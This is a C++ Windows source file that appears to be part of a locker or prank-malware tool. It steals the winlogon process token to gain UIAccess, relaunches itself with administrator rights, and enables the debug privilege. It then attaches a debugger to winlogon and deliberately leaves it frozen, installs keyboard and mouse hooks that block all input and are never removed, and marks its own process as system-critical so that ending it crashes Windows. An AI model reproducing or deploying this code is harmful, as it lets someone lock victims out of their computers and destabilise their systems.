#include "SysControl.h"
#include "Helper.h"
#include <tlhelp32.h>
#include <thread>

DWORD GetWinlogonPID() {
	// Create a snapshot.
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	// Search through running processes using the snapshot.
	Process32First(snapshot, &processEntry);
	do {
		// If the current process is winlogon.exe return its PID.
		if (lstrcmp(processEntry.szExeFile, L"winlogon.exe") == 0) {
			DWORD winlogonPID = processEntry.th32ProcessID;
			CloseHandle(snapshot);
			return winlogonPID;
		}
	} while (Process32Next(snapshot, &processEntry));

	// Cleanup and return 0 because winlogon.exe could not be found.
	CloseHandle(snapshot);
	return 0;
}

HANDLE CreateUIAccessToken() {
	// Open the current process token.
	HANDLE currentToken;
	OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_DUPLICATE, &currentToken);

	// Get the process ID of winlogon.
	DWORD winlogonPID = GetWinlogonPID();

	// Open a handle to the winlogon process.
	HANDLE winlogon = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, GetWinlogonPID());

	// Get the winlogon process token.
	HANDLE winlogonToken;
	OpenProcessToken(winlogon, TOKEN_QUERY | TOKEN_DUPLICATE, &winlogonToken);

	// Duplicate the winlogon process token so we can use it.
	HANDLE winlogonTokenCopy;
	DuplicateTokenEx(winlogonToken, TOKEN_IMPERSONATE, NULL, SecurityImpersonation, TokenImpersonation, &winlogonTokenCopy);

	// Set the token of the current thread to that one we just stole from winlogon.
	(void)SetThreadToken(NULL, winlogonTokenCopy);

	// Duplicate the current token.
	HANDLE currentTokenCopy;
	DuplicateTokenEx(currentToken, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_DEFAULT, NULL, SecurityAnonymous, TokenPrimary, &currentTokenCopy);

	// Give UIAccess to the copy of the current token we just made.
	BOOL uiAccess = TRUE;
	SetTokenInformation(currentTokenCopy, TokenUIAccess, &uiAccess, sizeof(uiAccess));

	// Set the token of the current thread back to the original token.
	(void)SetThreadToken(NULL, NULL);

	//Return and cleanup
	CloseHandle(currentToken);
	CloseHandle(winlogon);
	CloseHandle(winlogonToken);
	CloseHandle(winlogonTokenCopy);
	return currentTokenCopy;
}

BOOL HasUIAccess() {
	// Open the current process token.
	HANDLE token;
	OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token);

	// Check if the current process token has UI Access already.
	DWORD tokenUIAccess = 0;
	DWORD returnLength = 0;
	GetTokenInformation(token, TokenUIAccess, &tokenUIAccess, sizeof(DWORD), &returnLength);

	// Close the handle to the current process token we opened earlier.
	CloseHandle(token);

	// tokenInformation is set by GetTokenInformation to 1 if UIAccess is granted otherwise it is 0.
	return tokenUIAccess != 0;
}

BOOL IsAdmin() {
	// Open the current process token.
	HANDLE token;
	OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token);

	// Check if the current process token has UI Access already.
	_TOKEN_ELEVATION tokenElevation = { };
	DWORD returnLength = 0;
	GetTokenInformation(token, TokenElevation, &tokenElevation, sizeof(DWORD), &returnLength);

	// Close the handle to the current process token we opened earlier.
	CloseHandle(token);

	// tokenInformation is set by GetTokenInformation to 1 if UIAccess is granted otherwise it is 0.
	return tokenElevation.TokenIsElevated != 0;
}

void RelaunchAsAdmin() {
	// Get the path to the current exe
	TCHAR szPath[MAX_PATH];
	GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath));

	// Create a shell execute info to launch the current exe with a UAC prompt.
	SHELLEXECUTEINFO sei = { sizeof(SHELLEXECUTEINFO) };
	sei.lpVerb = L"runas";
	sei.lpFile = szPath;

	// Launch the shell execute info with the shell.
	ShellExecuteEx(&sei);
}

void RelaunchWithUIAccess() {
	// Get a token with UIAccess
	HANDLE uiAccessToken = CreateUIAccessToken();

	// Launch the current process again with the new token.
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	GetStartupInfo(&si);
	CreateProcessAsUser(uiAccessToken, NULL, GetCommandLine(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

	// Cleanup and return
	CloseHandle(uiAccessToken);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

void TakeSEDebugPrivilege() {
	// Get the current process token.
	HANDLE currentToken = NULL;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &currentToken);

	// Lookup the SE_Debug_Privilage luid.
	LUID debugPrivilageLUID;
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &debugPrivilageLUID);

	// Grant ourselves the SE_Debug_Privilage.
	TOKEN_PRIVILEGES tokenPrivileges;
	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Luid = debugPrivilageLUID;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(currentToken, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);

	// Cleanup and return.
	CloseHandle(currentToken);
}

void BreakWinlogon() {
	DWORD winlogonPID = GetWinlogonPID();

	// Attach debugger to winlogon
	DebugActiveProcess(winlogonPID);

	// Open process handle to winlogon
	HANDLE winlogonHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, winlogonPID);

	// Break winlogon
	DebugBreakProcess(winlogonHandle);

	// The following code frees winlogon from its broken state. (We don't wanna do that)

	// Detach debugger
	// DebugActiveProcessStop(winlogonPID);

	// Free handle
	// CloseHandle(winlogonHandle);
}

LRESULT CALLBACK BlockingHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	return 1; // Returning 1 indicates the event has been handled and should not be sent to any other handlers.
}

void BlockInput()
{
	BOOL hookInitialized = FALSE;
	std::thread windowThread([&hookInitialized]() {
		// Set up the low level keyboard and mouse hooks to disable those devices.
		HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, BlockingHookProc, NULL, NULL);
		HHOOK mouseHook = SetWindowsHookEx(WH_MOUSE_LL, BlockingHookProc, NULL, NULL);

		hookInitialized = TRUE;

		MSG msg = { };
		while (GetMessage(&msg, NULL, 0, 0))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}

		// The following code removes the hooks we set earlier (We don't wanna do that)
		//UnhookWindowsHookEx(keyboardHook);
		//UnhookWindowsHookEx(mouseHook);
		});
	windowThread.detach();

	while (!hookInitialized) {}
}

void MakeSystemCritical()
{
	typedef long (WINAPI* RtlSetProcessIsCritical) (
		IN BOOLEAN    bNew, // new setting for process
		OUT BOOLEAN* pbOld, // pointer which receives old setting (can be null)
		IN BOOLEAN    bNeedScb); // need system critical breaks

	HANDLE ntdll = LoadLibrary(L"ntdll.dll");
	RtlSetProcessIsCritical SetCriticalProcess;

	SetCriticalProcess = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)ntdll, "RtlSetProcessIsCritical");

	SetCriticalProcess(TRUE, NULL, FALSE);
}